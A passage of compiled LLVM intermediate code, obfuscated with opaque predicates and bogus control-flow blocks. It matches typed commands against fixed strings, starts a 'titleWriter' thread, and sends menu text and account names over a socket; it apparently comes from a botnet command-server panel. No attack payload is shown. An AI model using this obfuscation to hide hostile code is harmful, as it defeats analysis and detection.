  %1161 = icmp eq i32 %1160, 0
  %1162 = icmp slt i32 %1157, 10
  %1163 = or i1 %1161, %1162
  br i1 %1163, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %1164

; <label>:1164:                                   ; preds = %originalBBpart2136
  br label %561

; <label>:1165:                                   ; preds = %958
  %1166 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1167 = call i8* @strstr(i8* %1166, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.57, i32 0, i32 0)) #8
  %1168 = icmp ne i8* %1167, null
  br i1 %1168, label %1181, label %1169

; <label>:1169:                                   ; preds = %1165
  %1170 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1171 = call i8* @strstr(i8* %1170, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0)) #8
  %1172 = icmp ne i8* %1171, null
  br i1 %1172, label %1181, label %1173

; <label>:1173:                                   ; preds = %1169
  %1174 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1175 = call i8* @strstr(i8* %1174, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0)) #8
  %1176 = icmp ne i8* %1175, null
  br i1 %1176, label %1181, label %1177

; <label>:1177:                                   ; preds = %1173
  %1178 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1179 = call i8* @strstr(i8* %1178, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.60, i32 0, i32 0)) #8
  %1180 = icmp ne i8* %1179, null
  br i1 %1180, label %1181, label %1380

; <label>:1181:                                   ; preds = %1177, %1173, %1169, %1165
  %1182 = load i8*, i8** %3, align 8
  %1183 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1182) #7
  %1184 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i32 0, i32 0
  %1185 = call i32 (i8*, i8*, ...) @sprintf(i8* %1184, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.61, i32 0, i32 0)) #7
  %1186 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i32 0, i32 0
  %1187 = call i32 (i8*, i8*, ...) @sprintf(i8* %1186, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1188 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i32 0, i32 0
  %1189 = call i32 (i8*, i8*, ...) @sprintf(i8* %1188, i8* getelementptr inbounds ([114 x i8], [114 x i8]* @.str.62, i32 0, i32 0)) #7
  %1190 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i32 0, i32 0
  %1191 = call i32 (i8*, i8*, ...) @sprintf(i8* %1190, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.63, i32 0, i32 0)) #7
  %1192 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i32 0, i32 0
  %1193 = call i32 (i8*, i8*, ...) @sprintf(i8* %1192, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.64, i32 0, i32 0)) #7
  %1194 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i32 0, i32 0
  %1195 = call i32 (i8*, i8*, ...) @sprintf(i8* %1194, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.65, i32 0, i32 0)) #7
  %1196 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i32 0, i32 0
  %1197 = call i32 (i8*, i8*, ...) @sprintf(i8* %1196, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.66, i32 0, i32 0)) #7
  %1198 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i32 0, i32 0
  %1199 = call i32 (i8*, i8*, ...) @sprintf(i8* %1198, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1200 = load i32, i32* %4, align 4
  %1201 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i32 0, i32 0
  %1202 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i32 0, i32 0
  %1203 = call i64 @strlen(i8* %1202) #8
  %1204 = call i64 @send(i32 %1200, i8* %1201, i64 %1203, i32 16384)
  %1205 = icmp eq i64 %1204, -1
  br i1 %1205, label %1206, label %1207

; <label>:1206:                                   ; preds = %1181
  br label %4181

; <label>:1207:                                   ; preds = %1181
  %1208 = load i32, i32* @x.17
  %1209 = load i32, i32* @y.18
  %1210 = sub i32 %1208, 1
  %1211 = mul i32 %1208, %1210
  %1212 = urem i32 %1211, 2
  %1213 = icmp eq i32 %1212, 0
  %1214 = icmp slt i32 %1209, 10
  %1215 = or i1 %1213, %1214
  br i1 %1215, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1207
  %1216 = load i32, i32* %4, align 4
  %1217 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i32 0, i32 0
  %1218 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i32 0, i32 0
  %1219 = call i64 @strlen(i8* %1218) #8
  %1220 = call i64 @send(i32 %1216, i8* %1217, i64 %1219, i32 16384)
  %1221 = icmp eq i64 %1220, -1
  %1222 = load i32, i32* @x.17
  %1223 = load i32, i32* @y.18
  %1224 = sub i32 %1222, 1
  %1225 = mul i32 %1222, %1224
  %1226 = urem i32 %1225, 2
  %1227 = icmp eq i32 %1226, 0
  %1228 = icmp slt i32 %1223, 10
  %1229 = or i1 %1227, %1228
  br i1 %1229, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br i1 %1221, label %1230, label %1231

; <label>:1230:                                   ; preds = %originalBBpart2140
  br label %4181

; <label>:1231:                                   ; preds = %originalBBpart2140
  %1232 = load i32, i32* @x.17
  %1233 = load i32, i32* @y.18
  %1234 = sub i32 %1232, 1
  %1235 = mul i32 %1232, %1234
  %1236 = urem i32 %1235, 2
  %1237 = icmp eq i32 %1236, 0
  %1238 = icmp slt i32 %1233, 10
  %1239 = or i1 %1237, %1238
  br i1 %1239, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1231
  %1240 = load i32, i32* %4, align 4
  %1241 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i32 0, i32 0
  %1242 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i32 0, i32 0
  %1243 = call i64 @strlen(i8* %1242) #8
  %1244 = call i64 @send(i32 %1240, i8* %1241, i64 %1243, i32 16384)
  %1245 = icmp eq i64 %1244, -1
  %1246 = load i32, i32* @x.17
  %1247 = load i32, i32* @y.18
  %1248 = sub i32 %1246, 1
  %1249 = mul i32 %1246, %1248
  %1250 = urem i32 %1249, 2
  %1251 = icmp eq i32 %1250, 0
  %1252 = icmp slt i32 %1247, 10
  %1253 = or i1 %1251, %1252
  br i1 %1253, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br i1 %1245, label %1254, label %1255

; <label>:1254:                                   ; preds = %originalBBpart2144
  br label %4181

; <label>:1255:                                   ; preds = %originalBBpart2144
  %1256 = load i32, i32* %4, align 4
  %1257 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i32 0, i32 0
  %1258 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i32 0, i32 0
  %1259 = call i64 @strlen(i8* %1258) #8
  %1260 = call i64 @send(i32 %1256, i8* %1257, i64 %1259, i32 16384)
  %1261 = icmp eq i64 %1260, -1
  br i1 %1261, label %1262, label %1263

; <label>:1262:                                   ; preds = %1255
  br label %4181

; <label>:1263:                                   ; preds = %1255
  %1264 = load i32, i32* @x.17
  %1265 = load i32, i32* @y.18
  %1266 = sub i32 %1264, 1
  %1267 = mul i32 %1264, %1266
  %1268 = urem i32 %1267, 2
  %1269 = icmp eq i32 %1268, 0
  %1270 = icmp slt i32 %1265, 10
  %1271 = or i1 %1269, %1270
  br i1 %1271, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1263
  %1272 = load i32, i32* %4, align 4
  %1273 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i32 0, i32 0
  %1274 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i32 0, i32 0
  %1275 = call i64 @strlen(i8* %1274) #8
  %1276 = call i64 @send(i32 %1272, i8* %1273, i64 %1275, i32 16384)
  %1277 = icmp eq i64 %1276, -1
  %1278 = load i32, i32* @x.17
  %1279 = load i32, i32* @y.18
  %1280 = sub i32 %1278, 1
  %1281 = mul i32 %1278, %1280
  %1282 = urem i32 %1281, 2
  %1283 = icmp eq i32 %1282, 0
  %1284 = icmp slt i32 %1279, 10
  %1285 = or i1 %1283, %1284
  br i1 %1285, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1277, label %1286, label %1303

; <label>:1286:                                   ; preds = %originalBBpart2148
  %1287 = load i32, i32* @x.17
  %1288 = load i32, i32* @y.18
  %1289 = sub i32 %1287, 1
  %1290 = mul i32 %1287, %1289
  %1291 = urem i32 %1290, 2
  %1292 = icmp eq i32 %1291, 0
  %1293 = icmp slt i32 %1288, 10
  %1294 = or i1 %1292, %1293
  br i1 %1294, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1286
  %1295 = load i32, i32* @x.17
  %1296 = load i32, i32* @y.18
  %1297 = sub i32 %1295, 1
  %1298 = mul i32 %1295, %1297
  %1299 = urem i32 %1298, 2
  %1300 = icmp eq i32 %1299, 0
  %1301 = icmp slt i32 %1296, 10
  %1302 = or i1 %1300, %1301
  br i1 %1302, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %4181

; <label>:1303:                                   ; preds = %originalBBpart2148
  %1304 = load i32, i32* %4, align 4
  %1305 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i32 0, i32 0
  %1306 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i32 0, i32 0
  %1307 = call i64 @strlen(i8* %1306) #8
  %1308 = call i64 @send(i32 %1304, i8* %1305, i64 %1307, i32 16384)
  %1309 = icmp eq i64 %1308, -1
  br i1 %1309, label %1310, label %1311

; <label>:1310:                                   ; preds = %1303
  br label %4181

; <label>:1311:                                   ; preds = %1303
  %1312 = load i32, i32* %4, align 4
  %1313 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i32 0, i32 0
  %1314 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i32 0, i32 0
  %1315 = call i64 @strlen(i8* %1314) #8
  %1316 = call i64 @send(i32 %1312, i8* %1313, i64 %1315, i32 16384)
  %1317 = icmp eq i64 %1316, -1
  br i1 %1317, label %1318, label %1335

; <label>:1318:                                   ; preds = %1311
  %1319 = load i32, i32* @x.17
  %1320 = load i32, i32* @y.18
  %1321 = sub i32 %1319, 1
  %1322 = mul i32 %1319, %1321
  %1323 = urem i32 %1322, 2
  %1324 = icmp eq i32 %1323, 0
  %1325 = icmp slt i32 %1320, 10
  %1326 = or i1 %1324, %1325
  br i1 %1326, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1318
  %1327 = load i32, i32* @x.17
  %1328 = load i32, i32* @y.18
  %1329 = sub i32 %1327, 1
  %1330 = mul i32 %1327, %1329
  %1331 = urem i32 %1330, 2
  %1332 = icmp eq i32 %1331, 0
  %1333 = icmp slt i32 %1328, 10
  %1334 = or i1 %1332, %1333
  br i1 %1334, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %4181

; <label>:1335:                                   ; preds = %1311
  %1336 = load i32, i32* %4, align 4
  %1337 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i32 0, i32 0
  %1338 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i32 0, i32 0
  %1339 = call i64 @strlen(i8* %1338) #8
  %1340 = call i64 @send(i32 %1336, i8* %1337, i64 %1339, i32 16384)
  %1341 = icmp eq i64 %1340, -1
  br i1 %1341, label %1342, label %1343

; <label>:1342:                                   ; preds = %1335
  br label %4181

; <label>:1343:                                   ; preds = %1335
  %1344 = load i8*, i8** %3, align 8
  %1345 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1344) #7
  br label %1346

; <label>:1346:                                   ; preds = %1343
  %1347 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1348 = load i32, i32* %5, align 4
  %1349 = sext i32 %1348 to i64
  %1350 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1349
  %1351 = getelementptr inbounds %struct.account, %struct.account* %1350, i32 0, i32 0
  %1352 = getelementptr inbounds [20 x i8], [20 x i8]* %1351, i32 0, i32 0
  %1353 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1354 = call i32 (i8*, i8*, ...) @sprintf(i8* %1347, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %1352, i8* %1353) #7
  %1355 = load i32, i32* %4, align 4
  %1356 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1357 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1358 = call i64 @strlen(i8* %1357) #8
  %1359 = call i64 @send(i32 %1355, i8* %1356, i64 %1358, i32 16384)
  %1360 = icmp eq i64 %1359, -1
  br i1 %1360, label %1361, label %1362

; <label>:1361:                                   ; preds = %1346
  br label %4181

; <label>:1362:                                   ; preds = %1346
  %1363 = load i32, i32* @x.17
  %1364 = load i32, i32* @y.18
  %1365 = sub i32 %1363, 1
  %1366 = mul i32 %1363, %1365
  %1367 = urem i32 %1366, 2
  %1368 = icmp eq i32 %1367, 0
  %1369 = icmp slt i32 %1364, 10
  %1370 = or i1 %1368, %1369
  br i1 %1370, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1362
  %1371 = load i32, i32* @x.17
  %1372 = load i32, i32* @y.18
  %1373 = sub i32 %1371, 1
  %1374 = mul i32 %1371, %1373
  %1375 = urem i32 %1374, 2
  %1376 = icmp eq i32 %1375, 0
  %1377 = icmp slt i32 %1372, 10
  %1378 = or i1 %1376, %1377
  br i1 %1378, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br label %1379

; <label>:1379:                                   ; preds = %originalBBpart2160
  br label %561

; <label>:1380:                                   ; preds = %1177
  %1381 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1382 = call i8* @strstr(i8* %1381, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #8
  %1383 = icmp ne i8* %1382, null
  br i1 %1383, label %1396, label %1384

; <label>:1384:                                   ; preds = %1380
  %1385 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1386 = call i8* @strstr(i8* %1385, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i32 0, i32 0)) #8
  %1387 = icmp ne i8* %1386, null
  br i1 %1387, label %1396, label %1388

; <label>:1388:                                   ; preds = %1384
  %1389 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1390 = call i8* @strstr(i8* %1389, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i32 0, i32 0)) #8
  %1391 = icmp ne i8* %1390, null
  br i1 %1391, label %1396, label %1392

; <label>:1392:                                   ; preds = %1388
  %1393 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1394 = call i8* @strstr(i8* %1393, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #8
  %1395 = icmp ne i8* %1394, null
  br i1 %1395, label %1396, label %1697

; <label>:1396:                                   ; preds = %1392, %1388, %1384, %1380
  %1397 = load i32, i32* @x.17
  %1398 = load i32, i32* @y.18
  %1399 = sub i32 %1397, 1
  %1400 = mul i32 %1397, %1399
  %1401 = urem i32 %1400, 2
  %1402 = icmp eq i32 %1401, 0
  %1403 = icmp slt i32 %1398, 10
  %1404 = or i1 %1402, %1403
  br i1 %1404, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1396
  %1405 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %1406 = call i32 (i8*, i8*, ...) @sprintf(i8* %1405, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.71, i32 0, i32 0)) #7
  %1407 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i32 0, i32 0
  %1408 = call i32 (i8*, i8*, ...) @sprintf(i8* %1407, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1409 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i32 0, i32 0
  %1410 = call i32 (i8*, i8*, ...) @sprintf(i8* %1409, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.72, i32 0, i32 0)) #7
  %1411 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %1412 = call i32 (i8*, i8*, ...) @sprintf(i8* %1411, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.73, i32 0, i32 0)) #7
  %1413 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i32 0, i32 0
  %1414 = call i32 (i8*, i8*, ...) @sprintf(i8* %1413, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.74, i32 0, i32 0)) #7
  %1415 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %1416 = call i32 (i8*, i8*, ...) @sprintf(i8* %1415, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.75, i32 0, i32 0)) #7
  %1417 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i32 0, i32 0
  %1418 = call i32 (i8*, i8*, ...) @sprintf(i8* %1417, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.76, i32 0, i32 0)) #7
  %1419 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i32 0, i32 0
  %1420 = call i32 (i8*, i8*, ...) @sprintf(i8* %1419, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.77, i32 0, i32 0)) #7
  %1421 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i32 0, i32 0
  %1422 = call i32 (i8*, i8*, ...) @sprintf(i8* %1421, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.78, i32 0, i32 0)) #7
  %1423 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i32 0, i32 0
  %1424 = call i32 (i8*, i8*, ...) @sprintf(i8* %1423, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.79, i32 0, i32 0)) #7
  %1425 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %1426 = call i32 (i8*, i8*, ...) @sprintf(i8* %1425, i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.80, i32 0, i32 0)) #7
  %1427 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %1428 = call i32 (i8*, i8*, ...) @sprintf(i8* %1427, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1429 = load i32, i32* %4, align 4
  %1430 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %1431 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %1432 = call i64 @strlen(i8* %1431) #8
  %1433 = call i64 @send(i32 %1429, i8* %1430, i64 %1432, i32 16384)
  %1434 = icmp eq i64 %1433, -1
  %1435 = load i32, i32* @x.17
  %1436 = load i32, i32* @y.18
  %1437 = sub i32 %1435, 1
  %1438 = mul i32 %1435, %1437
  %1439 = urem i32 %1438, 2
  %1440 = icmp eq i32 %1439, 0
  %1441 = icmp slt i32 %1436, 10
  %1442 = or i1 %1440, %1441
  br i1 %1442, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br i1 %1434, label %1443, label %1460

; <label>:1443:                                   ; preds = %originalBBpart2164
  %1444 = load i32, i32* @x.17
  %1445 = load i32, i32* @y.18
  %1446 = sub i32 %1444, 1
  %1447 = mul i32 %1444, %1446
  %1448 = urem i32 %1447, 2
  %1449 = icmp eq i32 %1448, 0
  %1450 = icmp slt i32 %1445, 10
  %1451 = or i1 %1449, %1450
  br i1 %1451, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1443
  %1452 = load i32, i32* @x.17
  %1453 = load i32, i32* @y.18
  %1454 = sub i32 %1452, 1
  %1455 = mul i32 %1452, %1454
  %1456 = urem i32 %1455, 2
  %1457 = icmp eq i32 %1456, 0
  %1458 = icmp slt i32 %1453, 10
  %1459 = or i1 %1457, %1458
  br i1 %1459, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %4181

; <label>:1460:                                   ; preds = %originalBBpart2164
  %1461 = load i32, i32* %4, align 4
  %1462 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i32 0, i32 0
  %1463 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i32 0, i32 0
  %1464 = call i64 @strlen(i8* %1463) #8
  %1465 = call i64 @send(i32 %1461, i8* %1462, i64 %1464, i32 16384)
  %1466 = icmp eq i64 %1465, -1
  br i1 %1466, label %1467, label %1468

; <label>:1467:                                   ; preds = %1460
  br label %4181

; <label>:1468:                                   ; preds = %1460
  %1469 = load i32, i32* %4, align 4
  %1470 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i32 0, i32 0
  %1471 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i32 0, i32 0
  %1472 = call i64 @strlen(i8* %1471) #8
  %1473 = call i64 @send(i32 %1469, i8* %1470, i64 %1472, i32 16384)
  %1474 = icmp eq i64 %1473, -1
  br i1 %1474, label %1475, label %1476

; <label>:1475:                                   ; preds = %1468
  br label %4181

; <label>:1476:                                   ; preds = %1468
  %1477 = load i32, i32* @x.17
  %1478 = load i32, i32* @y.18
  %1479 = sub i32 %1477, 1
  %1480 = mul i32 %1477, %1479
  %1481 = urem i32 %1480, 2
  %1482 = icmp eq i32 %1481, 0
  %1483 = icmp slt i32 %1478, 10
  %1484 = or i1 %1482, %1483
  br i1 %1484, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1476
  %1485 = load i32, i32* %4, align 4
  %1486 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %1487 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %1488 = call i64 @strlen(i8* %1487) #8
  %1489 = call i64 @send(i32 %1485, i8* %1486, i64 %1488, i32 16384)
  %1490 = icmp eq i64 %1489, -1
  %1491 = load i32, i32* @x.17
  %1492 = load i32, i32* @y.18
  %1493 = sub i32 %1491, 1
  %1494 = mul i32 %1491, %1493
  %1495 = urem i32 %1494, 2
  %1496 = icmp eq i32 %1495, 0
  %1497 = icmp slt i32 %1492, 10
  %1498 = or i1 %1496, %1497
  br i1 %1498, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br i1 %1490, label %1499, label %1516

; <label>:1499:                                   ; preds = %originalBBpart2172
  %1500 = load i32, i32* @x.17
  %1501 = load i32, i32* @y.18
  %1502 = sub i32 %1500, 1
  %1503 = mul i32 %1500, %1502
  %1504 = urem i32 %1503, 2
  %1505 = icmp eq i32 %1504, 0
  %1506 = icmp slt i32 %1501, 10
  %1507 = or i1 %1505, %1506
  br i1 %1507, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1499
  %1508 = load i32, i32* @x.17
  %1509 = load i32, i32* @y.18
  %1510 = sub i32 %1508, 1
  %1511 = mul i32 %1508, %1510
  %1512 = urem i32 %1511, 2
  %1513 = icmp eq i32 %1512, 0
  %1514 = icmp slt i32 %1509, 10
  %1515 = or i1 %1513, %1514
  br i1 %1515, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br label %4181

; <label>:1516:                                   ; preds = %originalBBpart2172
  %1517 = load i32, i32* %4, align 4
  %1518 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i32 0, i32 0
  %1519 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i32 0, i32 0
  %1520 = call i64 @strlen(i8* %1519) #8
  %1521 = call i64 @send(i32 %1517, i8* %1518, i64 %1520, i32 16384)
  %1522 = icmp eq i64 %1521, -1
  br i1 %1522, label %1523, label %1540

; <label>:1523:                                   ; preds = %1516
  %1524 = load i32, i32* @x.17
  %1525 = load i32, i32* @y.18
  %1526 = sub i32 %1524, 1
  %1527 = mul i32 %1524, %1526
  %1528 = urem i32 %1527, 2
  %1529 = icmp eq i32 %1528, 0
  %1530 = icmp slt i32 %1525, 10
  %1531 = or i1 %1529, %1530
  br i1 %1531, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1523
  %1532 = load i32, i32* @x.17
  %1533 = load i32, i32* @y.18
  %1534 = sub i32 %1532, 1
  %1535 = mul i32 %1532, %1534
  %1536 = urem i32 %1535, 2
  %1537 = icmp eq i32 %1536, 0
  %1538 = icmp slt i32 %1533, 10
  %1539 = or i1 %1537, %1538
  br i1 %1539, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br label %4181

; <label>:1540:                                   ; preds = %1516
  %1541 = load i32, i32* @x.17
  %1542 = load i32, i32* @y.18
  %1543 = sub i32 %1541, 1
  %1544 = mul i32 %1541, %1543
  %1545 = urem i32 %1544, 2
  %1546 = icmp eq i32 %1545, 0
  %1547 = icmp slt i32 %1542, 10
  %1548 = or i1 %1546, %1547
  br i1 %1548, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1540
  %1549 = load i32, i32* %4, align 4
  %1550 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %1551 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %1552 = call i64 @strlen(i8* %1551) #8
  %1553 = call i64 @send(i32 %1549, i8* %1550, i64 %1552, i32 16384)
  %1554 = icmp eq i64 %1553, -1
  %1555 = load i32, i32* @x.17
  %1556 = load i32, i32* @y.18
  %1557 = sub i32 %1555, 1
  %1558 = mul i32 %1555, %1557
  %1559 = urem i32 %1558, 2
  %1560 = icmp eq i32 %1559, 0
  %1561 = icmp slt i32 %1556, 10
  %1562 = or i1 %1560, %1561
  br i1 %1562, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br i1 %1554, label %1563, label %1564

; <label>:1563:                                   ; preds = %originalBBpart2184
  br label %4181

; <label>:1564:                                   ; preds = %originalBBpart2184
  %1565 = load i32, i32* %4, align 4
  %1566 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i32 0, i32 0
  %1567 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i32 0, i32 0
  %1568 = call i64 @strlen(i8* %1567) #8
  %1569 = call i64 @send(i32 %1565, i8* %1566, i64 %1568, i32 16384)
  %1570 = icmp eq i64 %1569, -1
  br i1 %1570, label %1571, label %1572

; <label>:1571:                                   ; preds = %1564
  br label %4181

; <label>:1572:                                   ; preds = %1564
  %1573 = load i32, i32* %4, align 4
  %1574 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i32 0, i32 0
  %1575 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i32 0, i32 0
  %1576 = call i64 @strlen(i8* %1575) #8
  %1577 = call i64 @send(i32 %1573, i8* %1574, i64 %1576, i32 16384)
  %1578 = icmp eq i64 %1577, -1
  br i1 %1578, label %1579, label %1596

; <label>:1579:                                   ; preds = %1572
  %1580 = load i32, i32* @x.17
  %1581 = load i32, i32* @y.18
  %1582 = sub i32 %1580, 1
  %1583 = mul i32 %1580, %1582
  %1584 = urem i32 %1583, 2
  %1585 = icmp eq i32 %1584, 0
  %1586 = icmp slt i32 %1581, 10
  %1587 = or i1 %1585, %1586
  br i1 %1587, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %1579
  %1588 = load i32, i32* @x.17
  %1589 = load i32, i32* @y.18
  %1590 = sub i32 %1588, 1
  %1591 = mul i32 %1588, %1590
  %1592 = urem i32 %1591, 2
  %1593 = icmp eq i32 %1592, 0
  %1594 = icmp slt i32 %1589, 10
  %1595 = or i1 %1593, %1594
  br i1 %1595, label %originalBBpart2188, label %originalBB186alteredBB

originalBBpart2188:                               ; preds = %originalBB186
  br label %4181

; <label>:1596:                                   ; preds = %1572
  %1597 = load i32, i32* %4, align 4
  %1598 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i32 0, i32 0
  %1599 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i32 0, i32 0
  %1600 = call i64 @strlen(i8* %1599) #8
  %1601 = call i64 @send(i32 %1597, i8* %1598, i64 %1600, i32 16384)
  %1602 = icmp eq i64 %1601, -1
  br i1 %1602, label %1603, label %1604

; <label>:1603:                                   ; preds = %1596
  br label %4181

